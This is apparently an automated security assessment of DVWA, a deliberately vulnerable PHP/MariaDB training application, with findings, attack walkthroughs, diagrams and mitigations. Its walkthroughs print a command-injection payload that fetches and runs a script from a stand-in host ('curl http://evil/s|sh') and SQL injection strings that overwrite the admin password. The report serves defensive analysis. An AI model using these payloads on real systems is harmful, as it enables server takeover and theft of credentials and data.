## Management Summary

### Verdict

🔴 **Critical security concerns** - This is a deliberately vulnerable web application training target, and attackers can take over the web server and read or rewrite its whole database. It should run only in an isolated lab and never hold real data or be reachable from the internet.

**Risk distribution:** 🔴 Critical: 2 · 🟠 High: 24 · 🟡 Medium: 31 · 🟢 Low: n/a · **Total: 57**<br/>**Findings register:** 81 · 🔴 Critical: 2 · 🟠 High: 34 · 🟡 Medium: 45 - the distribution above counts insecure-practice findings under their weakness; see [§8 Findings Register](#8-findings-register)<br/>**Assessment evidence:** 45 of 56 finding(s) confirmed in code<br/>**Weakness classes:** 18 (14 implementation, 4 design) - see [§7 Weakness Register](#7-weakness-register)

<br/>

**Security concerns behind this assessment:**

<blockquote style="border-left: 3px solid #dc2626; padding: 16px 20px; margin: 0;">

- **Server takeover through shell commands** — Operating-system command injection in the connectivity check lets an unauthenticated caller run arbitrary commands as the web server user. *(🔴 [F-004](#f-004) → [W-001](#w-001))*
- **Database read and rewritten by signed-in users** — SQL injection across several pages lets any signed-in user read other tables, bypass the password check, or overwrite the administrator password. *(🔴 [F-005](#f-005), 🟠 [F-017](#f-017), 🟠 [F-018](#f-018), 🟠 [F-019](#f-019), 🟠 [F-020](#f-020) → [W-002](#w-002))*
- **Database contents leaked through blind queries** — Blind SQL injection on cookie and form values lets signed-in users infer stored data from yes-or-no page responses. *(🟠 [F-021](#f-021), 🟠 [F-022](#f-022), 🟠 [F-023](#f-023) → [W-002](#w-002))*
- **Anyone can wipe the database** — The setup page needs no login, so any visitor can drop and recreate the database, resetting every account and record. *(🟠 [F-024](#f-024))*
- **Ordinary accounts become administrators** — Missing authorization and mass assignment on the user interface let unauthenticated callers read or change all users, including their access level. *(🟠 [F-039](#f-039), 🟡 [F-082](#f-082) → [W-004](#w-004), [W-012](#w-012))* — ✓ cited finding in a code-verified chain

</blockquote>

<br/>

The system is acceptable only as an isolated training target. Putting it near real data or a shared network would expose everything it holds.

**About this assessment:** An AI-assisted threat model derived from the implementation of DVWA. It reconstructs the implemented architecture (3 components and 1 external service, see [§2](#2-architecture-diagrams)) and identifies threats and control gaps in it.


**Method and limits:** Automated static analysis of code and configuration, not a pentest or a team threat-modeling session; Low and Informational findings not reported (threshold: medium) - see [§11 Out of Scope](#11-out-of-scope).

### Remediation Priorities

The root causes behind the findings, ranked by severity, each with the measures to do first. The lasting fix under a root cause removes it and every finding it causes. Every mitigation that fixes a Critical finding is listed. Details in the [§7 Weakness Register](#7-weakness-register) and the [§10 Mitigation Register](#10-mitigation-register).

### Open Questions for the Team

The code cannot answer these questions; the people who own the business and the deployment can. Each question states under it what its answer changes.

- _How critical are Database service credentials and User accounts and password hashes to the business, and what harm would their disclosure, manipulation or unavailability cause?_
  The answer weights the impact rating and fix order of every finding that reaches these assets.
- _Which sensitive business records can the production database account used by DVWA Web Application access?_ ([W-002](#w-002): [F-005](#f-005), [F-017](#f-017), [F-018](#f-018) +5 more)
  Personal or regulated data in reach raises both the breach impact and any notification duty; a narrowly scoped account limits the blast radius.
- _If an attacker runs code in DVWA Web Application, which other services, secrets or credentials can that process reach?_ ([F-004](#f-004), [F-076](#f-076) (unproven))
  Every reachable service or credential extends this from one component to a wider compromise and raises the priority of isolating that process; an isolated process contains it.

### Security Posture & Top Threats

**Figure 1a - Runtime Architecture and Threat Overview**

At runtime, the system has 2 components in 2 layers and exchanges data with 1 external service. Figure 1a shows these data flows and where each of the 4 attack scenarios below begins. The complete boundary catalogue remains in [§1 Trust Boundaries](#trust-boundaries).

**Build pipeline**, not drawn in this runtime view: GitHub Actions. ④ A2 · Supply-Chain / Build Attacker → [Figure 1b](#figure-1b).

Role access and finding assignments are listed in [Identified Actors](#identified-actors).

<a id="figure-1b"></a>

**Figure 1b - Supply Chain and Build**

The repository builds in GitHub Actions. Figure 1b shows the inputs, build systems and release artifacts the repository evidences, with 8 findings attached to them. The highlighted path follows 🟡 [F-055](#f-055) — Container images referenced by floating tags without digest pinning as far as the repository evidences it. The control assessment is in [§6.11](#611-operations-runtime-and-supply-chain-controls).

**Figure 2 - Attack Routes and Impact**

Each numbered route names one example finding from the corresponding Top Threats group with its access prerequisite, the register weakness it is linked to, and the group's potential business harm, which depends on deployment and affected assets. W-IDs in parentheses link the example to an existing weakness. The attack step, affected component and technical consequence are listed in the findings register. Red arrows indicate attacks; dashed red arrows involve a victim; grey arrows lead to potential harm.

<picture><source media="(prefers-color-scheme: dark)" srcset="security-assessment-dvwa-thorough-0.1.0.figure2-dark.svg"><img src="security-assessment-dvwa-thorough-0.1.0.figure2.svg" alt="Figure 2 - Actors, attack routes, weaknesses and impact"></picture>

**Threat actors.** The actors below drive the numbered attack paths in the figures above.

- **Anonymous Internet Attacker** — no account or prior foothold; drives ① Insecure Query Construction & Data Access, ② Hardcoded Secrets & Weak Cryptography, ③ Broken Authorization & Access Control, ⑤ Sensitive File & Secret Exposure.
- **Supply-Chain / Build Attacker** — compromises a dependency or build pipeline, or contributes malicious code to a public repo; drives ④ Build Pipeline & Dependency Integrity.

**5 structural threats**, grouped by weakness class - each row is one threat, not one finding. *Threat Description* states the general architectural weakness (STRIDE in brackets); *Findings* lists the concrete instances by severity under their component, each linked to the [§8 Findings Register](#8-findings-register), and on screen an ID shows its title when you point at it; *Risk & Impact* combines severity with business consequence; *Primary Measures* names the most important measures for this threat, most important first, one per root cause. All measures are in the [§10 Mitigation Register](#10-mitigation-register).

|---|------------------------------------|------------------------------------------------|------------------------------------|----------------------|
| <a id="path-injection"></a>① | **Insecure Query Construction & Data Access** _(T·I)_<br/>Request data is concatenated into shell commands and SQL statements, letting attackers run commands and read or rewrite database content. | → [C-03](#c-03) DVWA Web Application<br/>🔴&nbsp;<span style="white-space:nowrap"><a href="#f-004" title="OS command injection in health connectivity check and ping feature">F-004</a></span>, <span style="white-space:nowrap"><a href="#f-005" title="SQL injection in user detail update endpoint">F-005</a></span><br/>🟠&nbsp;<span style="white-space:nowrap"><a href="#f-017" title="SQL injection in brute-force login query">F-017</a></span>, <span style="white-space:nowrap"><a href="#f-018" title="Second-order SQL injection">F-018</a></span>, <span style="white-space:nowrap"><a href="#f-019" title="SQL injection">F-019</a></span>, <span style="white-space:nowrap"><a href="#f-020" title="SQL injection in unquoted numeric context despite escaping">F-020</a></span>, <span style="white-space:nowrap"><a href="#f-021" title="Blind SQL injection">F-021</a></span>, <span style="white-space:nowrap"><a href="#f-022" title="Blind SQL injection">F-022</a></span>, <span style="white-space:nowrap"><a href="#f-014" title="SQL injection">F-014</a></span>, <span style="white-space:nowrap"><a href="#f-015" title="SQL injection">F-015</a></span>, <span style="white-space:nowrap"><a href="#f-016" title="SQL injection">F-016</a></span>, <span style="white-space:nowrap"><a href="#f-023" title="Blind SQL injection">F-023</a></span> | 🔴 Critical<br/>Full Server Compromise · Customer Data Exfiltration | <span style="white-space:nowrap">● [M-014](#m-014)</span> - Use prepared statements for user update query<br/><span style="white-space:nowrap">● [M-013](#m-013)</span> - Validate target host and use escapeshellarg |
| <a id="path-auth-bypass"></a>② | **Hardcoded Secrets & Weak Cryptography** _(S·E)_<br/>authentication can be circumvented or forged because credentials, signing keys, or password hashes are weak, missing, or exposed. | → [C-03](#c-03) DVWA Web Application<br/>🟠&nbsp;<span style="white-space:nowrap"><a href="#f-002" title="Broken MD5 hashing used for stored passwords without salt or strength policy">F-002</a></span>, <span style="white-space:nowrap"><a href="#f-029" title="Hardcoded symmetric encryption keys in source">F-029</a></span>, <span style="white-space:nowrap"><a href="#f-030" title="Unsalted MD5 password hashing">F-030</a></span><br/><details><summary>5 Medium</summary>→ [C-03](#c-03) DVWA Web Application<br/>🟡&nbsp;<span style="white-space:nowrap"><a href="#f-043" title="Hardcoded encryption key and static secret allow API token">F-043</a></span>, <span style="white-space:nowrap"><a href="#f-051" title="Hardcoded client secret and user password in API login">F-051</a></span>, <span style="white-space:nowrap"><a href="#f-052" title="Static access token accepted from the URL query string">F-052</a></span>, <span style="white-space:nowrap"><a href="#f-069" title="Repeating-key XOR used as message encryption">F-069</a></span>, <span style="white-space:nowrap"><a href="#f-070" title="Broken hash primitive">F-070</a></span></details> | 🟠 High<br/>Full Admin Takeover · Customer Data Exfiltration | <span style="white-space:nowrap">◕ [M-011](#m-011)</span> - Use modern cryptographic hash and KDF algorithms<br/><span style="white-space:nowrap">● [M-035](#m-035)</span> - Load keys from a secret store |
| <a id="path-privilege-escalation"></a>③ | **Broken Authorization & Access Control** _(E·I)_<br/>Authorization checks are absent or controlled by the client, so callers can read and modify other users and raise privileges. | → [C-03](#c-03) DVWA Web Application<br/>🟠&nbsp;<span style="white-space:nowrap"><a href="#f-039" title="Admin-only user endpoints gated">F-039</a></span>, <span style="white-space:nowrap"><a href="#f-006" title="Password change does not require the current password">F-006</a></span><br/>🟡&nbsp;<span style="white-space:nowrap"><a href="#f-082" title="Unauthenticated user API allows mass assignment">F-082</a></span><br/><details><summary>3 Medium</summary>→ [C-03](#c-03) DVWA Web Application<br/>🟡&nbsp;<span style="white-space:nowrap"><a href="#f-079" title="Security controls gated by client-controlled cookie">F-079</a></span>, <span style="white-space:nowrap"><a href="#f-080" title="Profile authorization trusts client user&#95;id cookie">F-080</a></span>, <span style="white-space:nowrap"><a href="#f-081" title="IDOR guarded by static public token">F-081</a></span></details> | 🟠 High<br/>Full Admin Takeover | <span style="white-space:nowrap">◕ [M-043](#m-043)</span> - Enforce server-side authorization on every endpoint<br/><span style="white-space:nowrap">◕ [M-015](#m-015)</span> - Verify the current password before any password change<br/><span style="white-space:nowrap">◕ [M-082](#m-082)</span> - Allowlist client-controlled fields |
| <a id="path-supply-chain"></a>④ | **Build Pipeline & Dependency Integrity** _(T·E)_<br/>Credentials are committed to the repository or dumped into build logs, exposing them to anyone with repository access. | → [C-02](#c-02) CI/CD Pipeline<br/>🟠&nbsp;<span style="white-space:nowrap"><a href="#f-026" title="All repository secrets dumped base64-encoded to workflow">F-026</a></span>, <span style="white-space:nowrap"><a href="#f-027" title="Hardcoded MariaDB root and application passwords in compose">F-027</a></span><br/>→ [C-01](#c-01) MariaDB Database<br/>🟡&nbsp;<span style="white-space:nowrap"><a href="#f-040" title="Hardcoded weak MariaDB root and application credentials">F-040</a></span><br/><details><summary>5 Medium</summary>→ [C-02](#c-02) CI/CD Pipeline<br/>🟡&nbsp;<span style="white-space:nowrap"><a href="#f-055" title="Container images referenced by floating tags without digest pinning">F-055</a></span>, <span style="white-space:nowrap"><a href="#f-056" title="Third-party GitHub Actions pinned to mutable tags instead of commit SHAs">F-056</a></span>, <span style="white-space:nowrap"><a href="#f-073" title="Workflows lack explicit permissions block for GITHUB&#95;TOKEN">F-073</a></span>, <span style="white-space:nowrap"><a href="#f-074" title="Container Runs as Root">F-074</a></span>, <span style="white-space:nowrap"><a href="#f-075" title="Missing Workflow Permissions Block">F-075</a></span></details> | 🟠 High<br/>Customer Data Exfiltration | <span style="white-space:nowrap">◕ [M-033](#m-033)</span> - Remove secret dumping step from vulnerable workflow<br/><span style="white-space:nowrap">◕ [M-007](#m-007)</span> - docker-compose secrets supplied by reference |
| <a id="path-sensitive-data-exposure"></a>⑤ | **Sensitive File & Secret Exposure** _(I)_<br/>confidential files, credentials, and management-plane endpoints are reachable on unauthenticated routes; SSRF lets the server fetch internal resources on the attacker's behalf; unsafe path-handling primitives leak server content. | → [C-03](#c-03) DVWA Web Application<br/>🟠&nbsp;<span style="white-space:nowrap"><a href="#f-028" title="Path traversal in source viewer discloses">F-028</a></span><br/>🟡&nbsp;<span style="white-space:nowrap"><a href="#f-003" title="Raw Database Error Disclosure to Client">F-003</a></span>, <span style="white-space:nowrap"><a href="#f-047" title="Open redirect substring allow check bypassable">F-047</a></span><br/><details><summary>3 Medium</summary>→ [C-03](#c-03) DVWA Web Application<br/>🟡&nbsp;<span style="white-space:nowrap"><a href="#f-048" title="Open redirect to arbitrary URL">F-048</a></span>, <span style="white-space:nowrap"><a href="#f-049" title="Open redirect scheme denylist bypassable">F-049</a></span>, <span style="white-space:nowrap"><a href="#f-068" title="Legacy v1 user API discloses password hashes">F-068</a></span></details> | 🟠 High<br/>Customer Data Exfiltration | <span style="white-space:nowrap">◕ [M-034](#m-034)</span> - Constrain file paths to a safe base directory |

**Further threats without Critical or High findings:** Remote Code Execution (unsafe eval) (🟡 1). Their findings are in the [§8 Findings Register](#8-findings-register).

_STRIDE: S spoofing · T tampering · R repudiation · I information disclosure · D denial of service · E elevation of privilege. Risk, findings, components, impact and primary measures are derived deterministically; only the one-line weakness description is authored._

**Verified attack chains.** 5 fully viable ([AC-T-005](#ac-t-005), [AC-T-002](#ac-t-002), [AC-T-004](#ac-t-004), [AC-T-006](#ac-t-006), [AC-B-006](#ac-b-006)). These chains combine individual findings into end-to-end exploitation paths verified step-by-step against the code - see [§9 Abuse Cases](#9-abuse-cases) for the per-step breakdown and blocking mitigations.

### Operational Strengths

Operational controls rated Adequate or Partial - grouped into broad clusters (full per-control breakdown in [§6](#6-security-architecture)). Clusters demoted to Weak by open Critical/High findings appear in [§6](#6-security-architecture) instead, not here.

<colgroup><col width="18%" style="width:18%"><col width="32%" style="width:32%"><col width="14%" style="width:14%"><col width="36%" style="width:36%"></colgroup>
<thead><tr><th>Strength</th><th>What's in Place</th><th>Effectiveness</th><th>Open gaps</th></tr></thead>
<tbody>
<tr><td style="overflow-wrap:break-word"><strong>Authentication &amp; Session Management</strong></td><td style="overflow-wrap:break-word"><em>Identity issuance, route-level authorisation, and second-factor handling for this codebase.</em><br/>Anti-CSRF token on login<br/>Login SQL query construction</td><td style="overflow-wrap:break-word">⚠️ Partial</td><td style="overflow-wrap:break-word">5 High and 6 Medium findings remain open:<br/>🟠 <a href="#f-001">F-001</a> — Missing Anti-CSRF Token on State Changes<br/>🟠 <a href="#f-006">F-006</a> — Password change does not require the current password<br/>🟠 <a href="#f-024">F-024</a> — Unauthenticated database reset in setup page<br/>🟠 <a href="#f-025">F-025</a> — CSRF check bypass<br/>🟠 <a href="#f-039">F-039</a> — Admin-only user endpoints gated<br/><details><summary>6 Medium</summary>🟡 <a href="#f-041">F-041</a> — Login lacks attempt throttling or lockout<br/>🟡 <a href="#f-042">F-042</a> — No login attempt limiting on brute-force form<br/>🟡 <a href="#f-050">F-050</a> — CAPTCHA state trusted from client-supplied field<br/>🟡 <a href="#f-075">F-075</a> — Missing Workflow Permissions Block<br/>🟡 <a href="#f-081">F-081</a> — IDOR guarded by static public token<br/>🟡 <a href="#f-082">F-082</a> — Unauthenticated user API allows mass assignment</details></td></tr>
</tbody>
</table>


**Bottom line:** These controls narrow specific attack surfaces but none eliminates a Critical finding on its own.

## Critical Findings by Root Cause

2 of 2 Critical findings trace back to 2 root causes; fixing a root cause addresses every finding linked to it.

```mermaid
%%{init: {"flowchart": {"nodeSpacing": 14, "rankSpacing": 50, "padding": 8, "wrappingWidth": 260}}}%%
graph LR
    GOAL["2 Critical findings"]:::goal
    W001["W-001<br/>Application data builds operating-system commands"]:::rootcause
    T004["F-004 - OS command injection in health connectivity check and ping…<br/>HealthController.php"]:::leaf
    W002["W-002<br/>Database access relies on concatenated queries"]:::rootcause
    T005["F-005 - SQL injection in user detail update endpoint<br/>change_user_details.php"]:::leaf

    W001 --> GOAL
    T004 --> W001
    W002 --> GOAL
    T005 --> W002

    classDef goal fill:#0f172a,stroke:#000,color:#fff,stroke-width:3px
    classDef and_node fill:#334155,stroke:#1e293b,color:#fff,stroke-width:2px
    classDef or_node fill:#64748b,stroke:#334155,color:#fff,stroke-width:2px
    classDef leaf fill:#f3dada,stroke:#b71c1c,color:#7f0000,stroke-width:2px
    classDef rootcause fill:#334155,stroke:#1e293b,color:#fff,stroke-width:2px
    classDef unassigned fill:#f8fafc,stroke:#94a3b8,color:#334155,stroke-dasharray:4 3
```

**Structural fixes** (full detail in [§7 Weakness Register](#7-weakness-register)):

- **[W-001](#w-001)** — Call a fixed executable with an argument list and no shell, and accept only allowlisted argument values from callers _(closes [F-004](#f-004))_
- **[W-002](#w-002)** — Provide one parameterised repository or query-builder path and prohibit application-value interpolation in database queries _(closes [F-005](#f-005))_

## 1. System Overview

Damn Vulnerable Web Application (DVWA) is a PHP/MariaDB web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand…

**Repository:** `https://github.com/digininja/DVWA`

### Scope

This threat model covers 3 components of DVWA: 

- MariaDB Database
- CI/CD Pipeline
- DVWA Web Application

**Not individually examined:** 2 source files in 1 component had no route, lead or security signal (DVWA Web Application 2).

**Out of scope:** third-party hosted dependencies, browser runtime, operating-system kernel, and the underlying network infrastructure.

**Basis:** An automated, AI-assisted threat model built from the repository's source code and configuration - static analysis only, no dynamic or penetration testing. It describes the system as built, not as designed.

---

<a id="identified-actors"></a>
### Identified Actors

Figure 1a draws **Anonymous Internet Attacker** as attacker of DVWA. [Figure 1b](#figure-1b) draws **Supply-Chain / Build Attacker** and the build it attacks. Each row gives that actor's access and the findings attributed to it.

| Actor | Type | Access | Findings |
|----------------------|--------|----------------------|----------------|
| A1 · Anonymous Internet Attacker | Attacker | No account or prior foothold | - |
| A2 · Supply-Chain / Build Attacker | Attacker | Compromises a dependency or build pipeline,<br/>or contributes malicious code to a public<br/>repo | 🟠 2 · 🟡 6 |

73 findings (2 Critical, 32 High, 39 Medium) have no assigned actor. That does not mean they are out of reach.

---

### Trust Boundaries

Each row names a crossing and the condition it relies on. A modelled crossing does not prove that its control works.

Settings of the hosting platform at check time, not of the examined source revision. `set` means configured, not effective. `not checkable` means unknown, not missing protection.

Repository selection 1: skipped (local repository; supply a GitHub or GitLab URL to check its platform settings).

Who uses and attacks DVWA, and which external systems it exchanges data with. Solid arrows name the data a flow carries; dashed red arrows are attack routes. Actors carry the names Figure 1 uses (C4 Level 1).

```mermaid
flowchart LR
    A0["Anonymous Internet Attacker"]
    A1["Supply-Chain / Build Attacker"]
    subgraph TBEDGE["Trust boundary"]
        SYSTEM["DVWA"]
    end
    E0["Google reCAPTCHA"]
    A0 -.->|"via public interface"| SYSTEM
    A1 -.->|"via build pipeline"| SYSTEM
    SYSTEM -->|"CAPTCHA verification (HTTPS)"| E0

```

**Key takeaway:** DVWA has no modelled user role and depends on Google `reCAPTCHA`; Anonymous Internet Attacker and Supply-Chain / Build Attacker attack it.

*🔴 **Unsafe**: relied upon but defeated or trivially bypassable - fix it · 🔴 **Missing**: never built - add it · 🟠 **Weak**: present, with exploitable gaps · 🟡 **Partial**: covers some surfaces, meaningful gaps remain · 🟢 **Adequate**: present and sound. A control counts for the component whose paths hold its implementation evidence. A finding counts for every component it affects, so the columns can add up to more than the register. [§6](#6-security-architecture) holds the full assessment.*

**Key takeaway:** No component has a control rated Unsafe or Missing; 2 components have no component-specific control (C-01, C-03); 11 controls apply system-wide.

> **Legend:** `-->` synchronous request/response (REST, HTTPS, gRPC) · **red border** ≥ 3 Critical threats on the component · **amber border** ≥ 2 High threats

## 3. Attack Walkthroughs

This section walks through how the highest-risk findings are exploited - one short walkthrough per Critical, each with attack steps, a focused sequence diagram, and the primary mitigation. Which root cause each Critical traces back to is in [Critical Findings by Root Cause](#critical-findings-by-root-cause); full per-finding context (severity rationale, assets, detection signals) is in the [§8 Findings Register](#8-findings-register).

### 3.1 OS command injection in health connectivity check and ping feature

**Source:** 🔴 [F-004](#f-004) — `vulnerabilities/api/src/HealthController.php:88`

Severity 🔴 Critical ([CWE-78](https://cwe.mitre.org/data/definitions/78.html)). STRIDE: Tampering. See [§8 F-004](#f-004) for the full register row.

**Attack Steps**

1. I send POST `/vulnerabilities/api/v2/health/connectivity` with JSON body `{"target":"x; curl http://evil/s|sh"}` and no credentials.
2. The server runs `exec("ping -c 4 x; curl ...|sh")`, which executes my payload as the Apache user.
3. I use the resulting shell to read `config/config.inc.php` DB credentials and pivot to MariaDB.

**Sequence Diagram**

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant App
    Note over App: DVWA Web Application - vulnerabilities/api/src/HealthController.php:88
    Attacker->>App: The attacker sends a crafted request targeting vulnerabilities/api/src/HealthController.php line 88
    App->>App: OS command injection in health connectivity check and ping feature
    App-->>Attacker: The attacker reads the response confirming the weakness - CWE-78
    alt Current state — F-004
        Attacker->>App: The attacker sends the exploit for F-004
        App-->>Attacker: Exploit succeeds
    else After M-013 — Validate target host and use escapeshellarg
        Attacker->>App: The attacker retries the same request after the fix
        App-->>Attacker: Request rejected
    end
```

**Key takeaway:** Until ● [M-013](#m-013) (Validate target host and use escapeshellarg) lands, 🔴 [F-004](#f-004) — OS command injection in health connectivity check and ping feature is exploitable at `vulnerabilities/api/src/HealthController.php:88` (Critical-severity, [CWE-78](https://cwe.mitre.org/data/definitions/78.html)).

**Defense in Depth**

- Primary mitigation: ● [M-013](#m-013) (Validate target host and use escapeshellarg)

### 3.2 SQL injection in user detail update endpoint

**Source:** 🔴 [F-005](#f-005) — `vulnerabilities/authbypass/change_user_details.php:47`

Severity 🔴 Critical ([CWE-89](https://cwe.mitre.org/data/definitions/89.html)). STRIDE: Tampering. See [§8 F-005](#f-005) for the full register row.

**Attack Steps**

1. I send a POST to `/vulnerabilities/authbypass/change_user_details.php` with Cookie `security=low`, so the admin check is skipped.
2. I put `first_name` = x', `password=md5`('pw') where `user_id=1` -- in the JSON body, and it is concatenated into the UPDATE.
3. I log in to `login.php` as admin with password pw and take over the administrator account.

**Sequence Diagram**

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant API
    participant DB
    Note over API: DVWA Web Application - vulnerabilities/authbypass/change_user_details.php:47
    Note over DB: Database
    Attacker->>API: Crafted HTTP request to the affected endpoint with classical OR 1=1 payload
    API->>DB: SQL built by string interpolation - payload becomes query
    DB-->>API: First matching row regardless of intended predicate
    API-->>Attacker: 200 OK with authenticated session / leaked rows
    alt Current state — F-005
        Attacker->>API: The attacker sends the exploit for F-005
        API-->>Attacker: Exploit succeeds
    else After M-014 — Use prepared statements for user update query
        Attacker->>API: The attacker retries the same request after the fix
        API-->>Attacker: Request rejected
    end
```

**Key takeaway:** Until ● [M-014](#m-014) (Use prepared statements for user update query) lands, 🔴 [F-005](#f-005) — SQL injection in user detail update endpoint is exploitable at `vulnerabilities/authbypass/change_user_details.php:47` (Critical-severity, [CWE-89](https://cwe.mitre.org/data/definitions/89.html)).

**Defense in Depth**

- Primary mitigation: ● [M-014](#m-014) (Use prepared statements for user update query)

### 3.3 Hardcoded symmetric encryption keys in source

**Source:** 🟠 [F-029](#f-029) — `vulnerabilities/cryptography/source/token_library_impossible.php:3`

Severity 🟠 High ([CWE-321](https://cwe.mitre.org/data/definitions/321.html)). STRIDE: Information Disclosure. See [§8 F-029](#f-029) for the full register row.

**Attack Steps**

1. Anyone who reads the source, which DVWA exposes through `view_source`, learns the keys: 'rainbowclimbinghigh' is shared by the CBC and GCM token libraries, and the ECB and XOR keys are also embedded.
2. With these keys an attacker can decrypt or mint tokens.

**Sequence Diagram**

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant Repo
    participant App
    Note over Repo: Public repository
    Note over App: DVWA Web Application - vulnerabilities/cryptography/source/token_library_impossible.php:3
    Attacker->>Repo: Clone or browse - extract private key from vulnerabilities/cryptography/source/token_library_impossible.php line 3
    Attacker->>Attacker: Sign forged token / signature with the extracted key
    Attacker->>App: Submit forged artefact in normal authentication flow
    App-->>Attacker: Request accepted as authentic - signature validates
    alt Current state — F-029
        Attacker->>Repo: The attacker sends the exploit for F-029
        Repo-->>Attacker: Exploit succeeds
    else After M-035 — Load keys from a secret store
        Attacker->>Repo: The attacker retries the same request after the fix
        Repo-->>Attacker: Request rejected
    end
```

**Key takeaway:** Until ● [M-035](#m-035) (Load keys from a secret store) lands, 🟠 [F-029](#f-029) — Hardcoded symmetric encryption keys in source is exploitable at `vulnerabilities/cryptography/source/token_library_impossible.php:3` (High-severity, [CWE-321](https://cwe.mitre.org/data/definitions/321.html)).

**Defense in Depth**

- Primary mitigation: ● [M-035](#m-035) (Load keys from a secret store)

### 3.4 SQL injection in brute-force login query

**Source:** 🟠 [F-017](#f-017) — `vulnerabilities/brute/source/low.php:13`

Severity 🟠 High ([CWE-89](https://cwe.mitre.org/data/definitions/89.html)). STRIDE: Tampering. See [§8 F-017](#f-017) for the full register row.

**Attack Steps**

1. An authenticated user sends `username=admin`'-- to the brute force page.
2. The raw value is concatenated into the SELECT and run by `mysqli_query`.
3. This bypasses the password check and lets an attacker run arbitrary SQL against MariaDB.

**Sequence Diagram**

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant API
    participant DB
    Note over API: DVWA Web Application - vulnerabilities/brute/source/low.php:13
    Note over DB: Database
    Attacker->>API: Crafted HTTP request to the affected endpoint with classical OR 1=1 payload
    API->>DB: SQL built by string interpolation - payload becomes query
    DB-->>API: First matching row regardless of intended predicate
    API-->>Attacker: 200 OK with authenticated session / leaked rows
    alt Current state — F-017
        Attacker->>API: The attacker sends the exploit for F-017
        API-->>Attacker: Exploit succeeds
    else After M-024 — Use prepared statements for login lookup
        Attacker->>API: The attacker retries the same request after the fix
        API-->>Attacker: Request rejected
    end
```

**Key takeaway:** Until ● [M-024](#m-024) (Use prepared statements for login lookup) lands, 🟠 [F-017](#f-017) — SQL injection in brute-force login query is exploitable at `vulnerabilities/brute/source/low.php:13` (High-severity, [CWE-89](https://cwe.mitre.org/data/definitions/89.html)).

**Defense in Depth**

- Primary mitigation: ● [M-024](#m-024) (Use prepared statements for login lookup)

### 3.8 Unauthenticated database reset in setup page

**Source:** 🟠 [F-024](#f-024) — `setup.php:6`

Severity 🟠 High ([CWE-306](https://cwe.mitre.org/data/definitions/306.html)). STRIDE: Tampering. See [§8 F-024](#f-024) for the full register row.

**Attack Steps**

1. An attacker crafts a request that reaches the code at `setup.php:6`.
2. The attacker sends it; the missing control never rejects the crafted input.
3. `setup.php` calls `dvwaPageStartup` without 'authenticated'; any client loads the page for a token and POSTs `create_db`, dropping and recreating the database and resetting all accounts and data.

**Sequence Diagram**

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant App
    Note over App: DVWA Web Application - setup.php:6
    Attacker->>App: The attacker sends a crafted request targeting setup.php line 6
    App->>App: Unauthenticated database reset in setup page
    App-->>Attacker: The attacker reads the response confirming the weakness - CWE-306
    alt Current state — F-024
        Attacker->>App: The attacker sends the exploit for F-024
        App-->>Attacker: Exploit succeeds
    else After M-031 — Require authentication on every exposed endpoint
        Attacker->>App: The attacker retries the same request after the fix
        App-->>Attacker: Request rejected
    end
```

**Key takeaway:** Until ● [M-031](#m-031) (Require authentication on every exposed endpoint) lands, 🟠 [F-024](#f-024) — Unauthenticated database reset in setup page is exploitable at `setup.php:6` (High-severity, [CWE-306](https://cwe.mitre.org/data/definitions/306.html)).

**Defense in Depth**

- Primary mitigation: ● [M-031](#m-031) (Require authentication on every exposed endpoint)

## 6. Security Architecture

This chapter is organized by security-control category. Findings are listed only where the affected control is described.

_Cataloged controls: 17 total - 2 adequate, 4 partial, 7 weak, 3 unsafe, 1 missing._

**How to read the verdicts.** Every control category (and every sub-control below it) carries exactly one status. The two red verdicts do **not** mean the same thing - this is the distinction that decides what you have to do about a finding:

| Status | Meaning | What to do |
|----------|------------------------------------|----------------------|
| 🔴 Unsafe | Present and relied upon, but defeated or<br/>trivially bypassable | Fix the existing control |
| 🔴 Missing | Control was never built | Add the control |
| 🟠 Weak | Present, but has exploitable gaps | Strengthen it |
| 🟡 Partial | Present, but with meaningful gaps | Close the gap |
| 🟢 Adequate | Control is present and sound | Nothing, keep it |

So "🔴 Unsafe" on a control category does *not* mean the control is absent - it means the control exists but does not hold (e.g. an `MD5` password hash, a raw-SQL query path, a hardcoded signing key). "🔴 Missing" is reserved for controls that were never built (e.g. no `Content-Security-Policy` header).

**Controls covered:**

- [6.2.1 Password Login](#621-password-login)

**Implemented controls:** Password login form with per-session `user_token` check, `mysqli_real_escape_string` on login input, `MD5`-hashed credential comparison.

It has no throttling or lockout (🟡 [F-041](#f-041), 🟡 [F-042](#f-042)), a string-built query (🟠 [F-017](#f-017)), and credentials in GET query strings (🟡 [F-046](#f-046)). Password change skips the current password (🟠 [F-006](#f-006)). Each successful flow ends in a server-side session, described in [§6.3 Session and Token Controls](#63-session-and-token-controls).

- 🟠 [F-006](#f-006) — Password change does not require the current password
- 🟠 [F-024](#f-024) — Unauthenticated database reset in setup page

<a id="password-login"></a>
#### 6.2.1 Password Login

**Status:** 🟠 Weak - the login checks a CSRF token, but attempts are unthrottled and the lookup query is string-built.

The brute-force login handler reads username and password from the request, validates the form token, and looks the user up in the `users` table by `MD5` password hash. A successful match starts the session.

The diagram shows the positive password-login path, including the CSRF token check and the credential lookup:
```mermaid
sequenceDiagram
    autonumber
    actor User
    participant Web as Login Handler
    participant DB as MariaDB
    User->>Web: Submit username, password and user_token
    Web->>Web: Check user_token against the session token
    Web->>DB: Query users by username and MD5 password hash
    DB-->>Web: Matching user row
    Web-->>User: Session established
```

**Security assessment**

Several independent weaknesses sit on the login path:

- Unthrottled login attempts allow unlimited password guessing (🟡 [F-041](#f-041), 🟡 [F-042](#f-042)).
- The lookup query is string-built, so injection reaches the credential check (🟠 [F-017](#f-017)).
- Passwords travel in GET query strings and land in logs and history (🟡 [F-046](#f-046)).
- The username is echoed back without encoding (🟡 [F-058](#f-058)).
- Password change accepts a new password without the current one (🟠 [F-006](#f-006)).



**Relevant findings**

- None linked to this control; see the other findings of this category.

### 6.3 Session and Token Controls

<a id="ctrl-session-and-token-controls"></a>

**Verdict:** 🟠 Weak

<!-- The line below is mechanically derived from the controls table — LLM must not re-author it. -->
**Controls covered:**

- [6.3.1 Anti-CSRF token on login](#631-anti-csrf-token-on-login)

**Implemented controls:** Anti-CSRF token on login.

